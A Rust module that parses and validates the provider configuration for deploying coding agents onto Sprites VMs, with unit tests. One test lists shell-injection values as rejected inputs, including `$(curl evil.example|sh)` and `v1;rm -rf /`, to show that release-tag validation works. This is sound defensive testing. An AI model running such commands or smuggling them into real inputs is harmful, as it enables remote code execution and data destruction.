//! `provider_config` schema and parsing (spec §Info, §`provider_config`).
//!
//! I2: credentials never transit config — the Sprites API token is resolved
//! ambiently (`credentials.rs`). The desktop additionally lint-fails any
//! config field whose word-split contains `secret|password|token|key|
//! credential`, so no credential-shaped field could exist even by accident;
//! every field name below is chosen to pass that lint.

use serde_json::json;

/// Default inactivity bound (seconds): the I5 opt-in, matching the Kubernetes
/// binding for cross-binding behavior parity. Feeds
/// `BUZZ_ACP_EXIT_AFTER_INACTIVITY` directly — the config field and that env
/// var are one knob, not two.
pub const DEFAULT_INACTIVITY_SECONDS: u64 = 7200;

/// The GitHub release tag sprig artifacts are fetched from. `sprig-latest` is
/// a *rolling* release: upstream re-publishes it on every commit, which is
/// why nothing here pins its bytes (see the digest note below).
pub const DEFAULT_SPRIG_VERSION: &str = "sprig-latest";

// The sprig tarball is what runs holding the agent's private key, so it is
// always verified before extraction. What it is verified *against* depends on
// the owner: `provider_config.sprig_sha256` when set (provenance — a digest
// the owner chose), otherwise the digest the release publishes beside the
// tarball (transport integrity — trust rooted in the release).
//
// There is deliberately no compiled-in pin. `sprig-latest` is a rolling tag
// that upstream re-publishes on every commit — observed moving twice within
// one afternoon — so a baked digest is stale within hours, and every deploy
// then fails on a mismatch that says nothing about the artifact.

/// Pinned npm versions of the ACP adapters provisioned when the corresponding
/// `install_*_adapter` flag is on. Baked provider state, like the sprig pins.
pub const CLAUDE_ADAPTER_VERSION: &str = "0.73.0";
pub const CODEX_ADAPTER_VERSION: &str = "1.8.0";

/// The agent's HOME and working directory inside the sprite (§Launch data:
/// cwd = HOME, mirroring the local spawn's agent-workdir convention). The
/// base image's user is `sprite` with this home.
pub const AGENT_HOME: &str = "/home/sprite";

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ProviderConfig {
    /// Sprites organization. `None` = the ambient CLI selection
    /// (`~/.sprites/sprites.json` `current_selection.org`).
    pub org: Option<String>,
    /// Always `Some` in v1 — `0` (indefinite) is refused in `parse`.
    pub inactivity_seconds: Option<u64>,
    pub sprig_version: String,
    /// A digest the owner demands. `None` = verify against the digest the
    /// release publishes beside the tarball.
    pub sprig_sha256: Option<String>,
    pub install_claude_adapter: bool,
    pub install_codex_adapter: bool,
    /// Pre-approve the agent's own tool use inside its sprite.
    ///
    /// The harness answers every ACP permission request with a denial —
    /// there is no approval path in it at all — and it overrides the mode
    /// the Sprites image already ships (`defaultMode: bypassPermissions`).
    /// So without pre-approval an agent cannot run a single tool: not a
    /// shell, not a file read, not its own git clone.
    ///
    /// Realized per runtime, because each enforces tool policy in its own
    /// place: for Claude Code, provisioning converges the settings allow
    /// rules — written when on, *removed* when off. For Codex, whose
    /// adapter reads no settings file, the launch env carries
    /// `INITIAL_AGENT_MODE` (full access when on, read-only when off — see
    /// `env.rs`). `buzz-agent` has no permission surface to configure.
    ///
    /// Default on, because an agent that cannot act is not what anyone
    /// deploys a coding agent for. Turn it off for an agent that should
    /// only converse — and note the sprite is a single-tenant VM whose
    /// shell already exposes the agent's key, so this widens what the
    /// agent may do, not who may reach it.
    pub preapprove_agent_tools: bool,
}

/// Read an optional string field. Empty and whitespace-only collapse to
/// `None`; any non-string, non-null value is refused with the field named,
/// so a mistyped field fails at the boundary instead of downstream.
fn optional_string(cfg: &serde_json::Value, field: &str) -> Result<Option<String>, String> {
    match cfg.get(field) {
        None | Some(serde_json::Value::Null) => Ok(None),
        Some(serde_json::Value::String(s)) if s.trim().is_empty() => Ok(None),
        Some(serde_json::Value::String(s)) => Ok(Some(s.trim().to_string())),
        Some(other) => Err(format!(
            "provider_config.{field} must be a string, got {other}"
        )),
    }
}

/// Read an optional unsigned integer. The desktop's form omits blank numeric
/// fields rather than sending `""` — but a cleared field can still arrive as
/// `""` (upstream Known Defect 8), and a hand-crafted payload may send a
/// numeric string — accept number and numeric string, refuse anything else.
fn optional_u64(cfg: &serde_json::Value, field: &str) -> Result<Option<u64>, String> {
    match cfg.get(field) {
        None | Some(serde_json::Value::Null) => Ok(None),
        Some(serde_json::Value::Number(n)) => n.as_u64().map(Some).ok_or_else(|| {
            format!("provider_config.{field} must be a non-negative integer, got {n}")
        }),
        Some(serde_json::Value::String(s)) if s.trim().is_empty() => Ok(None),
        Some(serde_json::Value::String(s)) => s.trim().parse::<u64>().map(Some).map_err(|_| {
            format!("provider_config.{field} must be a non-negative integer, got {s:?}")
        }),
        Some(other) => Err(format!(
            "provider_config.{field} must be a non-negative integer, got {other}"
        )),
    }
}

/// Read an optional boolean. The desktop's form coerces checkbox values, but
/// a hand-crafted payload may send `"true"`/`"false"` strings — accept both
/// spellings, refuse anything else.
fn optional_bool(cfg: &serde_json::Value, field: &str) -> Result<Option<bool>, String> {
    match cfg.get(field) {
        None | Some(serde_json::Value::Null) => Ok(None),
        Some(serde_json::Value::Bool(b)) => Ok(Some(*b)),
        Some(serde_json::Value::String(s)) if s.trim().is_empty() => Ok(None),
        Some(serde_json::Value::String(s)) => match s.trim() {
            "true" => Ok(Some(true)),
            "false" => Ok(Some(false)),
            other => Err(format!(
                "provider_config.{field} must be a boolean, got {other:?}"
            )),
        },
        Some(other) => Err(format!(
            "provider_config.{field} must be a boolean, got {other}"
        )),
    }
}

pub fn parse(cfg: &serde_json::Value) -> Result<ProviderConfig, String> {
    if !cfg.is_object() && !cfg.is_null() {
        return Err("provider_config must be a JSON object".to_string());
    }

    // `inactivity_seconds: 0` is a legal, blessed value in the spec
    // (§Auto-Stop) meaning "no auto-stop" — but an indefinite agent needs a
    // supervisor that restarts crashes without resurrecting intentional
    // exits, and no conforming one exists on this substrate: the Sprites
    // service runtime restarts even an intentional clean exit (and treats
    // TERM as a crash), and the harness clean-exit contract is unpinned
    // upstream (Known Defect 6). Refusing the combination is what the spec
    // asks for; silently keeping the session model would ship an indefinite
    // agent that dies on its first crash.
    let inactivity_seconds = match optional_u64(cfg, "inactivity_seconds")? {
        None => Some(DEFAULT_INACTIVITY_SECONDS),
        Some(0) => {
            return Err(
                "provider_config.inactivity_seconds: 0 (indefinite lifetime) is not \
                 supported in this version: no Sprites supervisor can restart crashes \
                 without also resurrecting intentional exits, which the spec forbids \
                 (I5). Set a positive number of seconds."
                    .to_string(),
            )
        }
        Some(n) => Some(n),
    };

    // The version becomes a path segment of the release-asset URL that a
    // provisioning shell fetches. Tag characters only: anything else is
    // either a URL-shape escape (`/`, `?`, `#`) or shell-active (`$`,
    // backtick, quotes, spaces) — and this field is the one provision input
    // an agent's owner types freely.
    let sprig_version =
        optional_string(cfg, "sprig_version")?.unwrap_or_else(|| DEFAULT_SPRIG_VERSION.to_string());
    if !sprig_version
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
    {
        return Err(format!(
            "provider_config.sprig_version {sprig_version:?} is not a release \
             tag: expected only ASCII letters, digits, '.', '_', or '-'"
        ));
    }

    let sprig_sha256 = optional_string(cfg, "sprig_sha256")?;
    if let Some(sha) = &sprig_sha256 {
        if sha.len() != 64
            || !sha
                .chars()
                .all(|c| c.is_ascii_hexdigit() && !c.is_ascii_uppercase())
        {
            return Err(format!(
                "provider_config.sprig_sha256 {sha:?} is not a SHA-256 digest: \
                 expected 64 lowercase hex characters"
            ));
        }
    }

    Ok(ProviderConfig {
        org: optional_string(cfg, "org")?,
        inactivity_seconds,
        sprig_version,
        sprig_sha256,
        install_claude_adapter: optional_bool(cfg, "install_claude_adapter")?.unwrap_or(true),
        install_codex_adapter: optional_bool(cfg, "install_codex_adapter")?.unwrap_or(true),
        preapprove_agent_tools: optional_bool(cfg, "preapprove_agent_tools")?.unwrap_or(true),
    })
}

/// The config form the desktop renders (spec §Info). Every field name is
/// chosen to pass the desktop's credential-word lint; nothing here is
/// required — org falls back to the ambient CLI selection and everything
/// else has a baked default.
pub fn config_schema() -> serde_json::Value {
    json!({
        "type": "object",
        "required": [],
        "properties": {
            "org": {
                "type": "string",
                "title": "Sprites organization",
                "description": "Leave empty to use the organization selected in the sprite CLI."
            },
            "inactivity_seconds": {
                "type": "number",
                "title": "Stop after inactivity (seconds)",
                "default": DEFAULT_INACTIVITY_SECONDS,
                "description": "The agent exits after this long with no work, and its sprite hibernates (storage-only billing). Start it again at any time."
            },
            "sprig_version": {
                "type": "string",
                "title": "Sprig release",
                "default": DEFAULT_SPRIG_VERSION,
                "description": "GitHub release tag of yjc801/buzz to fetch the agent runtime from."
            },
            "sprig_sha256": {
                "type": "string",
                "title": "Sprig digest override",
                "description": "SHA-256 of the sprig tarball for this sprite's architecture. Leave empty to verify against the digest the release publishes. Setting one demands that exact artifact — stronger, but you must update it whenever the release moves."
            },
            "install_claude_adapter": {
                "type": "boolean",
                "title": "Provision the Claude Code adapter",
                "default": true,
                "description": "npm-installs @agentclientprotocol/claude-agent-acp (pinned) so Claude-runtime agents can run in the sprite."
            },
            "install_codex_adapter": {
                "type": "boolean",
                "title": "Provision the Codex adapter",
                "default": true,
                "description": "npm-installs @agentclientprotocol/codex-acp (pinned) so Codex-runtime agents can run in the sprite."
            },
            "preapprove_agent_tools": {
                "type": "boolean",
                "title": "Let the agent use its tools",
                "default": true,
                "description": "Pre-approves the agent's tools inside the sprite: Claude Code gets shell/file/fetch allow rules, Codex starts in full-access mode. Without this the agent cannot act — the harness denies every permission request and there is nobody to ask. Turn off for a converse-only agent: the Claude rules are removed and Codex starts read-only."
            }
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn applies_defaults_to_an_empty_config() {
        let cfg = parse(&json!({})).unwrap();
        assert_eq!(cfg.org, None);
        assert_eq!(cfg.inactivity_seconds, Some(DEFAULT_INACTIVITY_SECONDS));
        assert_eq!(cfg.sprig_version, DEFAULT_SPRIG_VERSION);
        assert_eq!(cfg.sprig_sha256, None);
        assert!(cfg.install_claude_adapter);
        assert!(cfg.install_codex_adapter);
        // Null (the serde default for an absent provider_config) behaves the
        // same as {} — the desktop may omit the field entirely.
        assert_eq!(parse(&serde_json::Value::Null).unwrap(), cfg);
    }

    #[test]
    fn refuses_indefinite_lifetime() {
        for zero in [
            json!({"inactivity_seconds": 0}),
            json!({"inactivity_seconds": "0"}),
        ] {
            let err = parse(&zero).unwrap_err();
            assert!(err.contains("indefinite lifetime"), "{err}");
            assert!(err.contains("positive number"), "{err}");
        }
    }

    /// Known Defect 8: a cleared numeric form field can arrive as `""` — that
    /// collapses to the default; a non-numeric string is an in-band error.
    #[test]
    fn inactivity_accepts_number_string_and_blank() {
        assert_eq!(
            parse(&json!({"inactivity_seconds": 900}))
                .unwrap()
                .inactivity_seconds,
            Some(900)
        );
        assert_eq!(
            parse(&json!({"inactivity_seconds": "900"}))
                .unwrap()
                .inactivity_seconds,
            Some(900)
        );
        assert_eq!(
            parse(&json!({"inactivity_seconds": ""}))
                .unwrap()
                .inactivity_seconds,
            Some(DEFAULT_INACTIVITY_SECONDS)
        );
        let err = parse(&json!({"inactivity_seconds": "soon"})).unwrap_err();
        assert!(err.contains("inactivity_seconds"), "{err}");
        let err = parse(&json!({"inactivity_seconds": -5})).unwrap_err();
        assert!(err.contains("non-negative"), "{err}");
    }

    /// The version reaches a provisioning shell inside a download URL, so
    /// its grammar is a security boundary, not a formality: a value that
    /// carries shell substitution or URL structure must be refused at parse.
    #[test]
    fn sprig_version_must_be_release_tag_shaped() {
        for good in ["sprig-latest", "v1.2.3", "sprig_v0.2.0-rc.1"] {
            assert_eq!(
                parse(&json!({"sprig_version": good}))
                    .unwrap()
                    .sprig_version,
                good
            );
        }
        for bad in [
            "$(curl evil.example|sh)",
            "`boom`",
            "a b",
            "v1;rm -rf /",
            "../other-repo",
            "tag?x=1",
            "tag\"",
            "tag'",
        ] {
            let err = parse(&json!({"sprig_version": bad})).unwrap_err();
            assert!(err.contains("sprig_version"), "{bad:?}: {err}");
        }
    }

    #[test]
    fn sha_override_must_be_lowercase_hex64() {
        let good = "a".repeat(64);
        assert_eq!(
            parse(&json!({"sprig_sha256": good})).unwrap().sprig_sha256,
            Some("a".repeat(64))
        );
        for bad in ["abc", &"A".repeat(64), &"g".repeat(64)] {
            let err = parse(&json!({"sprig_sha256": bad})).unwrap_err();
            assert!(err.contains("sprig_sha256"), "{err}");
        }
    }

    #[test]
    fn adapter_flags_accept_bool_and_string_forms() {
        let cfg =
            parse(&json!({"install_claude_adapter": false, "install_codex_adapter": "false"}))
                .unwrap();
        assert!(!cfg.install_claude_adapter);
        assert!(!cfg.install_codex_adapter);
        let err = parse(&json!({"install_claude_adapter": "yes"})).unwrap_err();
        assert!(err.contains("install_claude_adapter"), "{err}");
    }

    #[test]
    fn mistyped_string_fields_are_named() {
        let err = parse(&json!({"org": 7})).unwrap_err();
        assert!(err.contains("provider_config.org"), "{err}");
    }

    /// I2: a credential smuggled into config is silently absorbed by nothing —
    /// parsing neither stores nor errors on unknown fields, and the schema
    /// declares no credential-shaped field for the desktop to render.
    #[test]
    fn credential_fields_have_no_effect() {
        let cfg = parse(&json!({"api_token": "sprt_tok_x", "org": "my-org"})).unwrap();
        assert_eq!(cfg.org.as_deref(), Some("my-org"));
        // The struct simply has nowhere to put it.
    }

    /// Pin the exact v1 field list: the desktop caps configs at 20 fields and
    /// lints field names for credential words; adding a field is a deliberate
    /// act that must update this test.
    #[test]
    fn schema_declares_exactly_the_v1_fields() {
        let schema = config_schema();
        let mut fields: Vec<&str> = schema["properties"]
            .as_object()
            .unwrap()
            .keys()
            .map(String::as_str)
            .collect();
        fields.sort_unstable();
        assert_eq!(
            fields,
            [
                "inactivity_seconds",
                "install_claude_adapter",
                "install_codex_adapter",
                "org",
                "preapprove_agent_tools",
                "sprig_sha256",
                "sprig_version",
            ]
        );
        assert_eq!(schema["required"], json!([]));
    }

    /// Replicate the desktop's `validate_provider_config` key lint: every
    /// schema field, word-split on `_`/`-`/`.` and camelCase boundaries, must
    /// avoid the banned words — a violating field name would fail EVERY
    /// deploy desktop-side, before this provider even runs.
    #[test]
    fn no_schema_field_trips_the_i2_key_lint() {
        const BANNED: [&str; 5] = ["secret", "password", "token", "key", "credential"];
        let schema = config_schema();
        for field in schema["properties"].as_object().unwrap().keys() {
            let words: Vec<String> = field
                .split(['_', '-', '.'])
                .flat_map(|seg| {
                    // camelCase boundaries: split before each uppercase run.
                    let mut words = Vec::new();
                    let mut current = String::new();
                    for c in seg.chars() {
                        if c.is_ascii_uppercase() && !current.is_empty() {
                            words.push(std::mem::take(&mut current));
                        }
                        current.push(c.to_ascii_lowercase());
                    }
                    if !current.is_empty() {
                        words.push(current);
                    }
                    words
                })
                .collect();
            for banned in BANNED {
                assert!(
                    !words.iter().any(|w| w == banned),
                    "schema field {field:?} word-splits into banned word {banned:?}"
                );
            }
        }
    }
}
